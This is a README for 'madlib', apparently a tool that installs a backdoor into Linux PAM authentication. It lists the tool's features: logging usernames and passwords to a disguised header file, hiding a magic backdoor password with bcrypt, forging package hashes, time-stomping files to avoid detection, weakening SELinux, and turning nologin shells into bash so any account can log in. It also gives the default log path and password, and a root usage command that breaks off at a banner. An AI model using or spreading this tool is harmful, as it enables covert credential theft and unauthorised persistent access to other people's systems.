# madlib
This is madlib, but it supports local files for the pam source code so it doesn't have to download anything.
## Features: 
* Logs username/passwords to file
* Obfuscates backdoor password with bcrypt (helps make reverse engineering more difficult and string dumps less effective)
* Automatically updates the DPKG MD5 hashes for all moved/replaced files
* Time stomps all moved/replaced files
* Updates SE Linux configuration to allow for changed file
* Replaces /bin/false, and /bin/nologin with /bin/bash (effectively making any user able to ssh in)
## Requirements:
* Requires Python3
* Root privileges needed
## Default Entries:
* Username/passwords by default are logged to `/usr/include/type.h`
* The default magic password is `secretpassxd`


## Usage

Manually Specifying PAM Version:

```
root@homebase /h/r/madlib# ./pam.py "1.3.0"
                    .___.__  ._____.
